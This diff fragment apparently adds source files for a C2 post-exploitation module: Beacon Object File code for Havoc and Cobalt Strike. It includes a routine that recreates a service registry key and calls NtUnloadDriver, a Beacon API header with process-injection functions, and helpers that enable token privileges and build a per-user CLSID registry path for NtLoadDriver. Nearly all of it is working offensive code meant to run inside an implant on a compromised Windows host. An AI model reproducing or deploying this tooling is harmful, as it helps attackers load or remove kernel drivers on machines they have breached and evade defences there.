+    LPCWSTR svcPrefixRel = L"SYSTEM\\CurrentControlSet\\Services\\";
+
+    LPWSTR fp = fullRegPath;
+    LPCWSTR t = svcPrefix;
+    while (*t)  *fp++ = *t++;
+    LPCWSTR dn = driverName;
+    while (*dn) *fp++ = *dn++;
+    *fp = L'\0';
+
+    LPWSTR rp = relativeRegPath;
+    t = svcPrefixRel;
+    while (*t)  *rp++ = *t++;
+    dn = driverName;
+    while (*dn) *rp++ = *dn++;
+    *rp = L'\0';
+
+    // ── 2. Recreate registry key for NtUnloadDriver ──────────
+    // NtUnloadDriver requires the key to exist — recreate it temporarily
+    HKEY  hKey   = NULL;
+    DWORD dwDisp = 0;
+    LONG  ret    = ADVAPI32$RegCreateKeyExW(
+                       HKEY_LOCAL_MACHINE,
+                       relativeRegPath,
+                       0, NULL,
+                       REG_OPTION_NON_VOLATILE,
+                       KEY_WRITE,
+                       NULL,
+                       &hKey,
+                       &dwDisp);
+
+    if (ret != ERROR_SUCCESS) {
+        BeaconPrintf(CALLBACK_ERROR,
+            "[-] RegCreateKeyEx failed: %ld\n", ret);
+        return;
+    }
+
+    // Populate with minimum required values
+    DWORD dwType  = 1;
+    DWORD dwStart = 3;
+    DWORD dwError = 1;
+    WCHAR dummy[] = L"\\??\\C:\\Windows\\System32\\drivers\\null.sys";
+
+    ADVAPI32$RegSetValueExW(hKey, L"ImagePath", 0, REG_EXPAND_SZ,
+        (BYTE*)dummy, wlen_bytes(dummy));
+    ADVAPI32$RegSetValueExW(hKey, L"Type", 0, REG_DWORD,
+        (BYTE*)&dwType, sizeof(DWORD));
+    ADVAPI32$RegSetValueExW(hKey, L"Start", 0, REG_DWORD,
+        (BYTE*)&dwStart, sizeof(DWORD));
+    ADVAPI32$RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD,
+        (BYTE*)&dwError, sizeof(DWORD));
+    ADVAPI32$RegCloseKey(hKey);
+    BeaconPrintf(CALLBACK_OUTPUT, "[2] Registry key recreated\n");
+
+    // ── 3. NtUnloadDriver ────────────────────────────────────
+    _NtUnloadDriver pNtUnloadDriver = NTDLL$NtUnloadDriver;
+
+    if (!pNtUnloadDriver) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] NtUnloadDriver not resolvable\n");
+        ADVAPI32$RegDeleteKeyW(HKEY_LOCAL_MACHINE, relativeRegPath);
+        return;
+    }
+
+    UNICODE_STRING uRegPath;
+    USHORT pathLen = 0;
+    while (fullRegPath[pathLen]) pathLen++;
+    uRegPath.Length        = pathLen * sizeof(WCHAR);
+    uRegPath.MaximumLength = uRegPath.Length + sizeof(WCHAR);
+    uRegPath.Buffer        = fullRegPath;
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[3] Calling NtUnloadDriver...\n");
+    NTSTATUS status = pNtUnloadDriver(&uRegPath);
+    BeaconPrintf(CALLBACK_OUTPUT, "[4] NtUnloadDriver returned\n");
+
+    // ── 4. Cleanup registry ───────────────────────────────────
+    ADVAPI32$RegDeleteKeyW(HKEY_LOCAL_MACHINE, relativeRegPath);
+
+    if (status == STATUS_SUCCESS) {
+        BeaconPrintf(CALLBACK_OUTPUT,
+            "[+] Driver unloaded. NTSTATUS: 0x%08X\n", status);
+    } else {
+        BeaconPrintf(CALLBACK_ERROR,
+            "[-] NtUnloadDriver failed. NTSTATUS: 0x%08X\n", status);
+    }
+}
+```
+
+`src/common/beacon.h`:
+
+```h
+/*
+ * BOF Beacon API Header
+ * Compatible with Havoc C2 and Cobalt Strike
+ */
+
+#ifndef _BEACON_H_
+#define _BEACON_H_
+
+#include <windows.h>
+
+/* Beacon Output Types */
+#define CALLBACK_OUTPUT      0x0
+#define CALLBACK_OUTPUT_OEM  0x1e
+#define CALLBACK_ERROR       0x0d
+#define CALLBACK_OUTPUT_UTF8 0x20
+
+/* Beacon Data Parser */
+typedef struct {
+    char* original;
+    char* buffer;
+    int   length;
+    int   size;
+} datap;
+
+/* Beacon Format */
+typedef struct {
+    char* original;
+    char* buffer;
+    int   length;
+    int   size;
+} formatp;
+
+/* Beacon API Functions - Provided by Havoc */
+DECLSPEC_IMPORT void    BeaconDataParse(datap* parser, char* buffer, int size);
+DECLSPEC_IMPORT int     BeaconDataInt(datap* parser);
+DECLSPEC_IMPORT short   BeaconDataShort(datap* parser);
+DECLSPEC_IMPORT int     BeaconDataLength(datap* parser);
+DECLSPEC_IMPORT char*   BeaconDataExtract(datap* parser, int* size);
+
+DECLSPEC_IMPORT void    BeaconFormatAlloc(formatp* format, int maxsz);
+DECLSPEC_IMPORT void    BeaconFormatReset(formatp* format);
+DECLSPEC_IMPORT void    BeaconFormatFree(formatp* format);
+DECLSPEC_IMPORT void    BeaconFormatAppend(formatp* format, char* text, int len);
+DECLSPEC_IMPORT void    BeaconFormatPrintf(formatp* format, char* fmt, ...);
+DECLSPEC_IMPORT char*   BeaconFormatToString(formatp* format, int* size);
+DECLSPEC_IMPORT void    BeaconFormatInt(formatp* format, int value);
+
+DECLSPEC_IMPORT void    BeaconPrintf(int type, char* fmt, ...);
+DECLSPEC_IMPORT void    BeaconOutput(int type, char* data, int len);
+
+DECLSPEC_IMPORT BOOL    BeaconUseToken(HANDLE token);
+DECLSPEC_IMPORT void    BeaconRevertToken(void);
+DECLSPEC_IMPORT BOOL    BeaconIsAdmin(void);
+
+DECLSPEC_IMPORT void    BeaconGetSpawnTo(BOOL x86, char* buffer, int length);
+DECLSPEC_IMPORT void    BeaconInjectProcess(HANDLE hProc, int pid, char* payload, int payload_len, int payload_offset, char* arg, int arg_len);
+DECLSPEC_IMPORT void    BeaconInjectTemporaryProcess(PROCESS_INFORMATION* pInfo, char* payload, int payload_len, int payload_offset, char* arg, int arg_len);
+DECLSPEC_IMPORT void    BeaconCleanupProcess(PROCESS_INFORMATION* pInfo);
+
+DECLSPEC_IMPORT BOOL    toWideChar(char* src, wchar_t* dst, int max);
+
+#endif /* _BEACON_H_ */
+
+```
+
+`src/common/ntdefs.h`:
+
+```h
+#pragma once
+#include <windows.h>
+
+// ─── NTSTATUS ────────────────────────────────────────────────
+typedef LONG NTSTATUS;
+#define STATUS_SUCCESS                  0x00000000
+#define STATUS_PRIVILEGE_NOT_HELD       0xC0000061
+#define STATUS_OBJECT_NAME_COLLISION    0xC0000035
+
+// ─── UNICODE_STRING ──────────────────────────────────────────
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+// ─── OBJECT_ATTRIBUTES ───────────────────────────────────────
+typedef struct _OBJECT_ATTRIBUTES {
+    ULONG           Length;
+    HANDLE          RootDirectory;
+    PUNICODE_STRING ObjectName;
+    ULONG           Attributes;
+    PVOID           SecurityDescriptor;
+    PVOID           SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
+
+#define InitializeObjectAttributes(p, n, a, r, s) \
+    do {                                           \
+        (p)->Length = sizeof(OBJECT_ATTRIBUTES);   \
+        (p)->RootDirectory = r;                    \
+        (p)->Attributes = a;                       \
+        (p)->ObjectName = n;                       \
+        (p)->SecurityDescriptor = s;               \
+        (p)->SecurityQualityOfService = NULL;      \
+    } while(0)
+
+// ─── FUNCTION POINTER TYPEDEFS ───────────────────────────────
+typedef NTSTATUS (NTAPI* _NtLoadDriver)(
+    PUNICODE_STRING DriverServiceName
+);
+
+typedef NTSTATUS (NTAPI* _NtUnloadDriver)(
+    PUNICODE_STRING DriverServiceName
+);
+
+typedef VOID (NTAPI* _RtlInitUnicodeString)(
+    PUNICODE_STRING DestinationString,
+    PCWSTR          SourceString
+);
+```
+
+`src/common/utils.h`:
+
+```h
+#pragma once
+#include "beacon.h"
+#include "ntdefs.h"
+
+// ─── DYNAMIC API RESOLUTION ──────────────────────────────────
+// Never use static imports in BOFs — always resolve at runtime
+
+// NTDLL
+#define NTDLL$NtLoadDriver \
+    ((_NtLoadDriver)KERNEL32$GetProcAddress( \
+        KERNEL32$GetModuleHandleA("ntdll.dll"), "NtLoadDriver"))
+
+#define NTDLL$NtUnloadDriver \
+    ((_NtUnloadDriver)KERNEL32$GetProcAddress( \
+        KERNEL32$GetModuleHandleA("ntdll.dll"), "NtUnloadDriver"))
+
+#define NTDLL$RtlInitUnicodeString \
+    ((_RtlInitUnicodeString)KERNEL32$GetProcAddress( \
+        KERNEL32$GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString"))
+
+// KERNEL32
+DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
+DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
+DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(VOID);
+DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess(VOID);
+DECLSPEC_IMPORT VOID    WINAPI KERNEL32$RtlZeroMemory(PVOID, SIZE_T);
+
+// ADVAPI32
+DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
+DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$LookupPrivilegeValueW(LPCWSTR, LPCWSTR, PLUID);
+DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL,
+                          PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
+DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegCreateKeyExW(HKEY, LPCWSTR, DWORD,
+                          LPWSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES,
+                          PHKEY, LPDWORD);
+DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegSetValueExW(HKEY, LPCWSTR, DWORD,
+                          DWORD, const BYTE*, DWORD);
+DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegQueryValueExW(HKEY, LPCWSTR, LPDWORD,
+                          LPDWORD, LPBYTE, LPDWORD);
+DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegDeleteKeyW(HKEY, LPCWSTR);
+DECLSPEC_IMPORT LONG  WINAPI ADVAPI32$RegCloseKey(HKEY);
+DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$GetTokenInformation(HANDLE,
+                          TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
+DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$ConvertSidToStringSidW(PSID, LPWSTR*);
+
+// ─── WSTRING HELPERS (no CRT, no wsprintfW) ──────────────────
+
+static void wcs_copy(LPWSTR dst, LPCWSTR src) {
+    while (*src) *dst++ = *src++;
+    *dst = L'\0';
+}
+
+static void wcs_append(LPWSTR dst, LPCWSTR src) {
+    while (*dst) dst++;
+    while (*src) *dst++ = *src++;
+    *dst = L'\0';
+}
+
+// ─── ENABLE PRIVILEGE ────────────────────────────────────────
+
+static BOOL EnablePrivilege(LPCWSTR privName) {
+    HANDLE hToken = NULL;
+    TOKEN_PRIVILEGES tp;
+    LUID luid;
+
+    if (!ADVAPI32$OpenProcessToken(
+            KERNEL32$GetCurrentProcess(),
+            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+            &hToken)) {
+        BeaconPrintf(CALLBACK_ERROR,
+            "[-] OpenProcessToken failed: %lu\n",
+            KERNEL32$GetLastError());
+        return FALSE;
+    }
+
+    if (!ADVAPI32$LookupPrivilegeValueW(NULL, privName, &luid)) {
+        BeaconPrintf(CALLBACK_ERROR,
+            "[-] LookupPrivilegeValue failed: %lu\n",
+            KERNEL32$GetLastError());
+        return FALSE;
+    }
+
+    tp.PrivilegeCount           = 1;
+    tp.Privileges[0].Luid       = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    if (!ADVAPI32$AdjustTokenPrivileges(
+            hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
+        BeaconPrintf(CALLBACK_ERROR,
+            "[-] AdjustTokenPrivileges failed: %lu\n",
+            KERNEL32$GetLastError());
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+// ─── GET CURRENT USER SID AS WIDE STRING ─────────────────────
+
+static BOOL GetCurrentUserSidString(LPWSTR sidStr, DWORD maxLen) {
+    HANDLE hToken        = NULL;
+    BYTE   tokenBuf[256] = {0};
+    DWORD  retLen        = 0;
+    LPWSTR sidStrRaw     = NULL;
+
+    if (!ADVAPI32$OpenProcessToken(
+            KERNEL32$GetCurrentProcess(),
+            TOKEN_QUERY, &hToken))
+        return FALSE;
+
+    ADVAPI32$GetTokenInformation(hToken, TokenUser,
+        tokenBuf, sizeof(tokenBuf), &retLen);
+
+    TOKEN_USER* pTokenUser = (TOKEN_USER*)tokenBuf;
+
+    if (!ADVAPI32$ConvertSidToStringSidW(
+            pTokenUser->User.Sid, &sidStrRaw))
+        return FALSE;
+
+    wcs_copy(sidStr, sidStrRaw);
+    return TRUE;
+}
+
+// ─── BUILD HKCU REGISTRY PATH ────────────────────────────────
+// fullPath     → \Registry\User\<SID>\Software\Classes\CLSID\<n>
+// relativePath → Software\Classes\CLSID\<n>
+
+static BOOL BuildRegPath(
+    LPCWSTR driverName,
+    LPWSTR  fullPath,
+    LPWSTR  relativePath)
+{
+    WCHAR sid[128] = {0};
+    if (!GetCurrentUserSidString(sid, 128))
+        return FALSE;
+
+    wcs_copy(fullPath,  L"\\Registry\\User\\");
+    wcs_append(fullPath, sid);
+    wcs_append(fullPath, L"\\Software\\Classes\\CLSID\\");
+    wcs_append(fullPath, driverName);
+
+    wcs_copy(relativePath,  L"Software\\Classes\\CLSID\\");
+    wcs_append(relativePath, driverName);
+
+    return TRUE;
+}
+```
